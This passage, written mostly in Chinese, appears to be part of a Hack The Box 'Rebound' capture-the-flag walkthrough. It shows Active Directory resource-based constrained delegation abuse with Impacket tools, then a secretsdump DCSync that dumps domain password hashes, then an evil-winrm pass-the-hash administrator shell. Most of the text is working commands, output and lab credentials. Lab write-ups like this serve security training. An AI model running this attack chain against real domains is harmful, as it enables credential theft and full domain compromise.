$krb5tgs$18$USER$REBOUND.HTB$*delegator$*$d18681bc307159d28a5dee77$7388dbaa197ffb2c1c1d8fd0f66364f10d54f413d38d3dc8d76ee15a5fdb14f368832fd07079a98621e71c5de8584afba4addd907407e91b47b5f972f16256e141a2902f4803b8df99e7d8713ea1026686e49402230b49657b52300b6b00e38c19a26f7054989a27bfee94a3622f60c60bf21f3440698689830991cc6743f4473ba341256d591b90f09f2a147db51c00fe30d5d71f2f1c26b206ca6dd1bc6c3f4d41c07ef872bbf6b8be34c811bb0dfde8de758fc257db360aa0cbcff89fd5b0b5bc7c62995e7725c87d3f9c9c87c7069d5b062ae171b545adbcf0bafea6433e52b7f24c6154e19728d71e72a9ea3c55eaa2091b4077ca4e194eac85bc5d1c1efda65dda0988d8c19d2df63641c0a170d196a01d66f6b911bf130265c0a89d59877f73a35f4a3ef417e4042c0dd47e1a7b9a75d5bc125e1501ab3a224ca5e6580f0940846a0cdc8bf68574ac5dac01efcaf937dabf57d65cf1399fd92909a5cb111e78ef4478cab989636d15fc07c04810c9b139f489331272b9155fc82b9c40a870e0076b688afbb08fb51277bed2279f71c62c97512ef56a090fd9149475e0184d3eb29ea33ce931067d84f570cd62dcfa3033dcf98aa9c8c59f3d412d11a962c69d8d9c9a488e3d4c118545e4f51d87906856632972362000b7d4ad71f8046c33e54f79db516c2e044fe79ed022dd649ae787c61931d8f549574200f127bdbfccf8f005316f2a71dac848df0a7e3571435341c014cb5b163e0e70e6de510858b0cf0341e535b3d9002fc06bea908cc8900cfa697f3b3c24aa765dd3b8b875a0d1a4b2c043943790ce88e4159c741b813ee504e044cda8cecdcb8557d09b6e6b9bb2179b83e12aa2e8f06abc9f7b237c9e77f232a40e7666731ebfaa6abf7152316df6437c718f654abe40f20c13252b579a791e7e0857e70c6919f41ae2678f93cab5b8fe472b14aff3a7cd3c8889e2b349a4831933d70ed202f4597bc8a00dfcc3d59b4eed91147b57fc732ebf62924139ec7312d4b5b5fe763d825fabf0a84ecd0ae297088ff4a9f9d8aa6879bd201f9d0cac32fc30c09016a5c3a34af261c3795adf847215f6ca4b454b4ff7b7e806d93880ffb443e8e3f51107527568c6248f0e759bf0a7c4ae614c1820c6125a709bede1d079b52f05d7f0456f825a4be8c8f6b62a6ce574b961297c945e736c564adeb8199c7bc9357e518851c6bac3a4e4322f1e3e6592d478b939189cc99b04170a62d5c867f3d0a5b506f0976b29b4aa30ef162e2dee75e4dd954f3913942ad182b73eebb929cbb65209ba53592f49a3024bab27df53f67310b8eef75acebcf26640206172b4681245f7ea1cc3b102c00dbed784ca31de4f172acb6ce5fe139c3c2e8f616583d25f7281cb008831cb1e3b6f02f7511ca3ec678fb8100425d0966a2f9a7d28ac9ecd5bdf52b3da64e90a86b95cabf1df30d7d61522fb1f5b663932275e91aa735975f445650b92cd58a16f1cd4f6e25420be34afd0a80a749419ccb720dc597de33812d188b0fa7a883766025e7f6e8ca032917404ca38b2de787fc348995cb4bade6881279672e475d3874851d9c07480914221fd57f102e2c6609edf799ce8eb19b81870326a58167515008dbdc7d6
[*] Decoding unencrypted data in credential[0]['ticket']:
[*]   Service Name                : delegator$
[*]   Service Realm               : REBOUND.HTB
[*]   Encryption type             : aes256_cts_hmac_sha1_96 (etype 18)
[-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied
```

在这个阶段，仍然可以通过两种方式滥用受约束委托:

1. 进行基于资源的受限委托(RBCD)攻击。
2. 在运行Kerberos侦听器时，强制或等待用户对服务进行身份验证。

目前，前者似乎是更可行的选择。

#### Resource-Based Constrained Delegation RBCD

为了执行RBCD攻击，需要将另一个服务或用户附加到delegator$的msDS-AllowedToActOnBehalfOfOtherIdentity属性，允许其他服务委托给delegator$。

根据服务必须至少有一个SPN的[constraint](https://www.thehacker.recipes/a-d/movement/kerberos#tickets)来选择服务，这导致选择ldap_monitor。为了使rbcd.py工作，需要修改/etc/hosts，在其他主机名之前添加dc01，如下所示:

``` bash
10.10.11.231 dc01 dc01.rebound.htb rebound.htb
```

***如果省略此更改，rbcd.py将返回[-]无效的服务器地址错误。***

``` bash
rbcd.py rebound.htb/delegator\$ -hashes :43e9069a73081ecfcbe1514e1d4e3bc8 -k -delegate-from ldap_monitor -delegate-to delegator$ -action write -dc-ip dc01 -use-ldaps
[-] CCache file is not found. Skipping...
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] ldap_monitor can now impersonate users on delegator$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     ldap_monitor   (S-1-5-21-4078382237-1492182817-2568127209-7681)
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rebound10.png)

可以在powerview中验证这个属性是否被修改过:

``` bash
powerview rebound.htb/oorend:'1GR8t@$$4u'@dc01.rebound.htb -k
Get-DomainObject -Identity delegator$
objectClass                                  : top
                                               person
                                               organizationalPerson
                                               user
                                               computer
                                               msDS-GroupManagedServiceAccount
cn                                           : delegator
distinguishedName                            : CN=delegator,CN=Managed Service Accounts,DC=rebound,DC=htb
instanceType                                 : 4
whenCreated                                  : 20230408090831.0Z
whenChanged                                  : 20240405143632.0Z
uSNCreated                                   : 69353
uSNChanged                                   : 428294
name                                         : delegator
objectGUID                                   : {c9da97ae-5e35-44d2-aa15-114aecdc0caf}
userAccountControl                           : WORKSTATION_TRUST_ACCOUNT [4096]
badPwdCount                                  : 0
codePage                                     : 0
countryCode                                  : 0
badPasswordTime                              : 04/04/2024
lastLogoff                                   : 0
lastLogon                                    : 04/05/2024
localPolicyFlags                             : 0
pwdLastSet                                   : 04/02/2024
primaryGroupID                               : 515
objectSid                                    : S-1-5-21-4078382237-1492182817-2568127209-7687
accountExpires                               : 9223372036854775807
logonCount                                   : 107
sAMAccountName                               : delegator$
sAMAccountType                               : 805306369
dNSHostName                                  : gmsa.rebound.htb
servicePrincipalName                         : browser/dc01.rebound.htb
objectCategory                               : CN=ms-DS-Group-Managed-Service-Account,CN=Schema,CN=Configuration,DC=rebound,DC=htb
isCriticalSystemObject                       : FALSE
dSCorePropagationData                        : 16010101000000.0Z
lastLogonTimestamp                           : 133562535487307243
msDS-AllowedToDelegateTo                     : http/dc01.rebound.htb
msDS-SupportedEncryptionTypes                : RC4-HMAC
                                               AES128
                                               AES256
msDS-AllowedToActOnBehalfOfOtherIdentity     : AQAEgEAAAAAAAAAAAAAAABQAAAAEACwAAQAAAAAAJAD/AQ8AAQUAAAAAAAUVAAAAnSwX8yHn8FjpghKZAR4AAAECAAAAAAAFIAAAACACAAA=
msDS-ManagedPasswordId                       : AQAAAEtEU0sCAAAAagEAAAoAAAAGAAAAqozXLXGPzBuv4FrBregFhwAAAAAYAAAAGAAAAHIAZQBiAG8AdQBuAGQALgBoAHQAYgAAAHIAZQBiAG8AdQBuAGQALgBoAHQAYgAAAA==
msDS-ManagedPasswordPreviousId               : AQAAAEtEU0sCAAAAagEAAAcAAAAeAAAAqozXLXGPzBuv4FrBregFhwAAAAAYAAAAGAAAAHIAZQBiAG8AdQBuAGQALgBoAHQAYgAAAHIAZQBiAG8AdQBuAGQALgBoAHQAYgAAAA==
msDS-ManagedPasswordInterval                 : 30
msDS-GroupMSAMembership                      : AQAEgBQAAAAAAAAAAAAAACQAAAABAgAAAAAABSAAAAAgAgAABAAsAAEAAAAAACQA/wEPAAEFAAAAAAAFFQAAAJ0sF/Mh5/BY6YISmQYeAAA=
```

再次运行findDelegation.py也会显示更新后的条目:

``` bash
findDelegation.py rebound.htb/oorend:'1GR8t@$$4u' -dc-ip dc01.rebound.htb -k
[*] Getting machine hostname
[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
AccountName   AccountType                          DelegationType                       DelegationRightsTo
------------  -----------------------------------  -----------------------------------  ---------------------
DC01$         Computer                             Unconstrained                        N/A
ldap_monitor  Person                               Resource-Based Constrained           delegator$
delegator$    ms-DS-Group-Managed-Service-Account  Constrained w/o Protocol Transition  http/dc01.rebound.htb
```

现在已经准备好执行RBCD了。想法是，可以作为任何帐户从delegator$上的ldap_monitor请求票证，为delegator$上的模拟帐户创建一个可转发的ST。将模拟DC01$，因为Administrator被标记为敏感，不能委托:

``` bash
Get-DomainUser -Identity Administrator
cn                                : Administrator
description                       : Built-in account for administering the computer/domain
distinguishedName                 : CN=Administrator,CN=Users,DC=rebound,DC=htb
memberOf                          : CN=Group Policy Creator Owners,CN=Users,DC=rebound,DC=htb
                                    CN=Domain Admins,CN=Users,DC=rebound,DC=htb
                                    CN=Enterprise Admins,CN=Users,DC=rebound,DC=htb
                                    CN=Schema Admins,CN=Users,DC=rebound,DC=htb
                                    CN=Administrators,CN=Builtin,DC=rebound,DC=htb
name                              : Administrator
objectGUID                        : {37857665-6e2e-4f12-9976-5c9babcd8282}
userAccountControl                : NORMAL_ACCOUNT [1114624]
                                    DONT_EXPIRE_PASSWORD
                                    NOT_DELEGATED
badPwdCount                       : 1
badPasswordTime                   : 04/05/2024
lastLogoff                        : 0
lastLogon                         : 03/29/2024
pwdLastSet                        : 04/08/2023
primaryGroupID                    : 513
objectSid                         : S-1-5-21-4078382237-1492182817-2568127209-500
adminCount                        : 1
sAMAccountName                    : Administrator
sAMAccountType                    : 805306368
objectCategory                    : CN=Person,CN=Schema,CN=Configuration,DC=rebound,DC=htb
```

然后可以使用delegator$的受限特权将可转发的ST转发到DC，从而在DC上为DC01$创建一个ST。

首先，从delegator$上的ldap_monitor请求一个ST，模拟DC01$。

``` bash
getST.py rebound.htb/ldap_monitor:'1GR8t@$$4u' -spn browser/dc01.rebound.htb -impersonate DC01$
[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating DC01$
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in DC01$@browser_dc01.rebound.htb@REBOUND.HTB.ccache
```

这允许通过提供刚刚生成的票证来跳过S4U2Self步骤，这是可转发的:

``` bash
describeTicket.py DC01\$@browser_dc01.rebound.htb@REBOUND.HTB.ccache
[*] Number of credentials in cache: 1
[*] Parsing credential[0]:
[*] Ticket Session Key            : 767d153d636e861400de859c0d561ba9
[*] User Name                     : DC01$
[*] User Realm                    : rebound.htb
[*] Service Name                  : browser/dc01.rebound.htb
[*] Service Realm                 : REBOUND.HTB
[*] Start Time                    : 05/04/2024 09:45:34 AM
[*] End Time                      : 05/04/2024 19:45:33 PM
[*] RenewTill                     : 06/04/2024 09:43:52 AM
[*] Flags                         : (0x40a10000) forwardable, renewable, pre_authent, enc_pa_rep
[*] KeyType                       : rc4_hmac
[*] Base64(key)                   : dn0VPWNuhhQA3oWcDVYbqQ==
[*] Kerberoast hash               : $krb5tgs$18$USER$REBOUND.HTB$*browser/dc01.rebound.htb*$8a9675ea512659235df48421$7458895533348641c64dc62d133e5e03b4884970efdc309d94bd69c6048ee1e41fc7223cbaa570d0dbaa677985115f8b10153b4e08f299f5e5625fbb8d280a8226ab6ec8aeec14a9cde49902c9441dfee71e0fc38bd342d8af61593edd951f1d9d05499e5c01bd3fbeab18cbdc7876a6a189fa7c853d944d6057312d52a53bbe294b2191211a247c198abd00bb95152f74b8b1488c343a381d28ced950705b379ada4cf2d433e87ecfc34dbc29026cc05042e81933a1221781064d17ffae974ac83038236a17cee8151eab2e11014a90deca09b7e05632d564728c489add0fc6f68b8bd0ab425e1f3a891d38f47e3bf61d07dc1a1e7211080b0ad1211eb5543455235dd9f01da926c249480fb8b195346cedba939a5ba9239f9f8c6d270524d6e5b1aad7aa8fb8488c75964ffc964098b60c212658725e85bea570c88396551e23e0af1f19f7042bfa38db3fb4f3ee87efca16931f7cdf05a5179d264b1d63addd312325d1012e2106d305aeecdc8e645eaa089890b37b0f44d615a547b0049bc2f4618e63ea9653437c5c18f16c115f106ef259d1800429d1302ccfef6c2392636a571789f83fd56596b776efbd784d0153beb770ae6eee1771fbb561c079803c5a56a0026946ecc88c730647df64968d65f6b91f6a096657e439e73c7145df53fc7e7ab8ead89ebdcf52952cd42f5e6a5496aaf3a1c3142ad719687769ec44de969223c94fe0990e9fe3f73e71fbd99cfff2f0a6c609a0a08c325ddbef586a1d4c88f5f648dcfe4390565f4ada6a13805152b247837cd2cac7adc98b1b4bd755829566896aea34e12f35ae6bd4f9ed29bc7849d998168e7a7ce3f67f6ba0ed6faf6a85c80e180234ef34d106ea7cdcdd45749849ada99ddc2e0e9584473cf69c785016d59df543965feaefaf254a621faa1a5dd4e8a397c1a70baae027c6e5d69bf934dd873566dbe6857b96450cae2a8e3ccdafa7d6550f3ebad667a3d1f4bd5a95729a817907d3246c34da60ff1ee54d31592e9e2c006feb485db8cde5ada3ef04dba13522409acbc835b2d66017f6366e27dfa487b1d15c634ef03446c7f0baf1b4e106161242c45704f026a1ed95207c6bdce5842d8ab9ab7606841a6c632140d4e543bf8d8a696d0960db0799ff19e4148294ef6d47be90c18d5c66fa69e69ea48390b73e2981d8d9146f5788c4d2bfe9ffb5498b75dcef923202fc8da417003280a27797ea0e5d6592cc0419f500df5cf6188d20be4b7d909ec3d137366da5ccc0d1a58b8a1a73bcdfc64d602ffa91d72c0438364ca56b195f8f5beed6f6f1720184ce553341b12cde0291eb24c6e8c5d96d186bbedcdff254673c3b4de709f3f6d3c27aabbb45c5779d223eb81e5b97fd7da406226d7012d5b1e350fe9f73b133dde5777efb7781b1b7759ccc8b8b3af0574d16ffd1a0ea0121973b3fd0129b07a0b4034163212242f5b429e9b562c4f9d6f69c91e1990701625d7afbc7624b70bc54d92040a9a02e0d5aab61abd85462a74624d35a25f1774df006705c7ffae4f8158f5c8a70e19b81f8b93ca2b9d0d50d193f462a80d1cc2cb6dd6f2efc96667ac1ce796e13ff721d7dd812efc9ec993fa99b2af0b7321fa4bc35ddc072caf2d2bf5aff6b9d2249490a2c97fbae72f66d4948f1aab10a15fc161a92e0a873136a1c581083c0b18c7cdbe8c13a2708e9f8f5e4f5bc389b9b808f98dcb25fdb80ca593049b6497819610cce55a755d568ab52253e563b7aa8e42dc4b5f659937188989582191a97652beff2eac4bf0bf5d064f1d29c2b662751ede388
[*] Decoding unencrypted data in credential[0]['ticket']:
[*]   Service Name                : browser/dc01.rebound.htb
[*]   Service Realm               : REBOUND.HTB
[*]   Encryption type             : aes256_cts_hmac_sha1_96 (etype 18)
[-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied
```

完成攻击

``` bash
getST.py rebound.htb/delegator\$ -hashes :43e9069a73081ecfcbe1514e1d4e3bc8 -spn http/dc01.rebound.htb -additional-ticket DC01\$@browser_dc01.rebound.htb@REBOUND.HTB.ccache -impersonate DC01$
[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating DC01$
[*]     Using additional ticket DC01$@browser_dc01.rebound.htb@REBOUND.HTB.ccache instead of S4U2Self
[*] Requesting S4U2Proxy
[*] Saving ticket in DC01$@http_dc01.rebound.htb@REBOUND.HTB.ccache
```

通过使用-additional-ticket flag指定可转发票据，将其直接提供给S4U2Proxy，这允许在域控制器上获得DC01$的ST。

最后，将票据提供给secretsdump.py，获得Administrator的hash。

``` bash
(impacket-fork) [root@kali ~ ]$ KRB5CCNAME=./DC01\$@http_dc01.rebound.htb@REBOUND.HTB.ccache secretsdump.py -k -no-pass dc01.rebound.htb -just-dc-user administrator
/root/impacket-fork/bin/secretsdump.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.10.1.dev1+20231106.134307.9aa93730', 'secretsdump.py')
Impacket for Exegol - v0.10.1.dev1+20231106.134307.9aa93730 - Copyright 2022 Fortra - forked by ThePorgs

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:176be138594933bb67db3b2572fc91b8:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:32fd2c37d71def86d7687c95c62395ffcbeaf13045d1779d6c0b95b056d5adb1
Administrator:aes128-cts-hmac-sha1-96:efc20229b67e032cba60e05a6c21431f
Administrator:des-cbc-md5:ad8ac2a825fe1080
[*] Cleaning up...
(impacket-fork) [root@kali ~ ]$ KRB5CCNAME='DC01$@http_dc01.rebound.htb@REBOUND.HTB.ccache' secretsdump.py -no-pass -k dc01.rebound.htb -just-dc-ntlm
/root/impacket-fork/bin/secretsdump.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.10.1.dev1+20231106.134307.9aa93730', 'secretsdump.py')
Impacket for Exegol - v0.10.1.dev1+20231106.134307.9aa93730 - Copyright 2022 Fortra - forked by ThePorgs

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:176be138594933bb67db3b2572fc91b8:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1108b27a9ff61ed4139d1443fbcf664b:::
ppaul:1951:aad3b435b51404eeaad3b435b51404ee:7785a4172e31e908159b0904e1153ec0:::
llune:2952:aad3b435b51404eeaad3b435b51404ee:e283977e2cbffafc0d6a6bd2a50ea680:::
fflock:3382:aad3b435b51404eeaad3b435b51404ee:1fc1d0f9c5ada600903200bc308f7981:::
jjones:5277:aad3b435b51404eeaad3b435b51404ee:e1ca2a386be17d4a7f938721ece7fef7:::
mmalone:5569:aad3b435b51404eeaad3b435b51404ee:87becdfa676275415836f7e3871eefa3:::
nnoon:5680:aad3b435b51404eeaad3b435b51404ee:f9a5317b1011878fc527848b6282cd6e:::
ldap_monitor:7681:aad3b435b51404eeaad3b435b51404ee:5af1ff64aac6100ea8fd2223b642d818:::
oorend:7682:aad3b435b51404eeaad3b435b51404ee:5af1ff64aac6100ea8fd2223b642d818:::
winrm_svc:7684:aad3b435b51404eeaad3b435b51404ee:4469650fd892e98933b4536d2e86e512:::
batch_runner:7685:aad3b435b51404eeaad3b435b51404ee:d8a34636c7180c5851c19d3e865814e0:::
tbrady:7686:aad3b435b51404eeaad3b435b51404ee:114e76d0be2f60bd75dc160ab3607215:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:989c1783900ffcb85de8d5ca4430c70f:::
delegator$:7687:aad3b435b51404eeaad3b435b51404ee:43e9069a73081ecfcbe1514e1d4e3bc8:::
[*] Cleaning up...
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rebound11.png)

使用evil-winrm获得一个administrator shell

``` bash
┌─[root@kali] - [~/hackthebox/machine/rebound] - [2582]
└─[$] evil-winrm -i dc01 -u administrator -H 176be138594933bb67db3b2572fc91b8                                                                         [5:36:50]

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
rebound\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../desktop
*Evil-WinRM* PS C:\Users\Administrator\desktop> cat root.txt
af2b247a25910f7c8b320c45ab507ae4
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rebound12.png)

#### Reference Sources

 - [0xdf's blog rebound walkthrough](https://0xdf.gitlab.io/2024/03/30/htb-rebound.html)
 - [Impacket](https://github.com/fortra/impacket)
 - [New Attack Paths? AS Requested Service Tickets](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)
 - [Support for Kerberoasting without pre-authentication and ST request through AS-REQ #1413](https://github.com/fortra/impacket/pull/1413)
 - [impacket github分支](https://github.com/ThePorgs/impacket)
 - [bloodhound.py](https://github.com/dirkjanm/BloodHound.py)
 - [Active Directory Bloodhound](https://academy.hackthebox.com/course/preview/active-directory-bloodhound)
 - [Descendant Object Takeover (DOT)](https://support.bloodhoundenterprise.io/hc/en-us/articles/17312347318043-GenericAll)
 - [powerview.py](https://github.com/aniqfakhrul/powerview.py)
 - [ShadowCredentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
 - [KrbRelay](https://github.com/cube0x0/KrbRelay)
 - [RunasCs](https://github.com/antonioCoco/RunasCs)
 - [bloodyAD](https://github.com/CravateRouge/bloodyAD)
 - [Service-for-User (S4U)](https://www.thehacker.recipes/a-d/movement/kerberos#service-for-user-extensions)

<!-- kb:end rebound -->

</details>

